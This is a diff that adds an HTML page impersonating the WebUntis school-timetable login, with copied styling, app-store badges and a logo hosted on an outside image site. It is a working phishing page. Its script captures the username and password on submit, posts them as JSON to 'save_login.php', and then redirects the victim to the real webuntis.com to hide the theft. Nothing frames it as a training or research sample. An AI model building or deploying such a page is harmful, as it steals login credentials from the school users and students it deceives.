@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <title>WebUntis Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      color: #383838;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 320px;
+      margin: 20px auto;
+      padding: 16px 12px;
+      box-sizing: border-box;
+    }
+    h2 {
+      text-align: center;
+      color: #3c4657;
+      font-weight: 600;
+      margin: 16px 0 20px 0;
+      font-size: 1.4rem;
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 20px auto;
+      max-width: 180px;
+      max-height: 50px;
+      object-fit: contain;
+    }
+    .portal-btn {
+      width: 100%;
+      border: 1.5px solid #cfd9de;
+      background: #fff;
+      color: #495768;
+      border-radius: 32px;
+      padding: 10px 0;
+      font-size: 1em;
+      margin-bottom: 16px;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .portal-btn:hover {
+      background: #f7f9fa;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      color: #a1a1a1;
+      font-size: 0.9em;
+      margin: 16px 0 6px 0;
+    }
+    .divider-line {
+      flex: 1;
+      border-bottom: 1px solid #eee;
+      margin: 0 8px;
+    }
+    .input-label {
+      font-size: 0.9em;
+      margin-bottom: 4px;
+      margin-top: 12px;
+      color: #65696c;
+      display: block;
+    }
+    .login-input {
+      width: 100%;
+      padding: 8px 10px;
+      border: none;
+      background: #fff9d0;
+      border-radius: 3px;
+      font-size: 1em;
+      box-sizing: border-box;
+      margin-bottom: 8px;
+    }
+    .pw-row {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+    .pw-eye {
+      background: transparent;
+      border: none;
+      position: absolute;
+      right: 6px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 24px;
+      height: 24px;
+      cursor: pointer;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .login-btn {
+      width: 100%;
+      background: #ff5c22;
+      color: #fff;
+      font-size: 1.1em;
+      border: none;
+      border-radius: 24px;
+      padding: 11px 0;
+      margin: 18px 0 8px 0;
+      cursor: pointer;
+      font-weight: 600;
+      transition: background 0.15s;
+    }
+    .login-btn:hover {
+      background: #e7531c;
+    }
+    .pw-link {
+      color: #206dd3;
+      font-size: 0.9em;
+      display: block;
+      text-align: center;
+      text-decoration: none;
+      margin-bottom: 14px;
+    }
+    .pw-link:hover {
+      text-decoration: underline;
+    }
+    .badges {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+    .footer-links {
+      text-align: center;
+      color: #757575;
+      font-size: 0.88em;
+      margin-top: 12px;
+    }
+    .footer-links a {
+      color: #757575;
+      text-decoration: underline;
+      margin: 0 5px;
+    }
+    .footer-links a:hover {
+      color: #206dd3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>WebUntis Login</h2>
+    <img class="logo" src="https://i.ibb.co/RT0d2dZq/Screenshot-2025-09-04-182055.png" alt="Logo" />
+    <button type="button" class="portal-btn">Login mit Bildungsportal</button>
+
+    <div class="divider"><span class="divider-line"></span>oder<span class="divider-line"></span></div>
+
+    <form id="loginForm">
+      <label class="input-label" for="user">Benutzername</label>
+      <input class="login-input" type="text" id="user" placeholder="Username" required />
+
+      <label class="input-label" for="pw">Passwort</label>
+      <div class="pw-row">
+        <input class="login-input" type="password" id="pw" placeholder="Passwort" required />
+        <button type="button" class="pw-eye" aria-label="Passwort anzeigen/ausblenden" title="Passwort anzeigen/ausblenden">
+          <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" viewBox="0 0 24 24" fill="#383838">
+            <path d="M12 5c-7.633 0-11 5.657-11 7s3.367 7 11 7 11-5.657 11-7-3.367-7-11-7zm0 12c-2.761 0-5-2.239-5-5s2.239-5 5-5 
+                     5 2.239 5 5-2.239 5-5 5zm0-3a2 2 0 110-4 2 2 0 010 4z"/>
+          </svg>
+        </button>
+      </div>
+
+      <button type="submit" class="login-btn">Login</button>
+    </form>
+    <a class="pw-link" href="#">Passwort vergessen?</a>
+    <div class="badges">
+      <a href="https://play.google.com/store/apps/details?id=com.grupet.web.app&hl=de_AT">
+        <img alt="Google Play" style="height:36px" src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" />
+      </a>
+      <a href="https://apps.apple.com/at/app/untis-mobile/id926186904">
+        <img alt="App Store" style="height:36px" src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" />
+      </a>
+    </div>
+    <div class="footer-links">
+      <a href="#">Impressum</a> | <a href="#">Jobs @ Untis</a>
+    </div>
+  </div>
+
+  <script>
+    // Passwort-Anzeige umschalten
+    const pwInput = document.getElementById('pw');
+    const pwToggleBtn = document.querySelector('.pw-eye');
+
+    pwToggleBtn.addEventListener('click', () => {
+      const type = pwInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      pwInput.setAttribute('type', type);
+      const svg = pwToggleBtn.querySelector('svg path');
+      if (type === 'text') {
+        svg.style.fill = '#ff5c22';
+      } else {
+        svg.style.fill = '#383838';
+      }
+    });
+
+    // Login-Formular absenden
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const user = document.getElementById('user').value;
+      const pw = document.getElementById('pw').value;
+
+      fetch('save_login.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({username: user, password: pw})
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log('Serverantwort:', data);
+        window.location.href = 'https://webuntis.com/';
+      })
+      .catch(error => {
+        console.error('Fehler beim Speichern:', error);
+      });
+    });
+  </script>
+</body>
+</html>
